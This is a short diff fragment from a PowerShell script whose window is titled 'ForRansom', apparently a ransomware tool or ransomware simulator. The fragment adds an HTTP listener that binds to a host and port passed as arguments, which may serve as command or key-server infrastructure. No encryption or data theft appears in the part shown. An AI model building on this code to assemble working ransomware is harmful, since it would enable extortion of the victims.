@@ -18,6 +18,12 @@ $Host.UI.RawUI.WindowTitle = "ForRansom"
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "White" }
 
+# Http Server
+$whost = $args[0]
+$wport = $args[1]
+$http = [System.Net.HttpListener]::new() 
+$http.Prefixes.Add("http://$whost`:$wport/")
+$http.Start()
 # Banner
 function Show-Banner {
 	
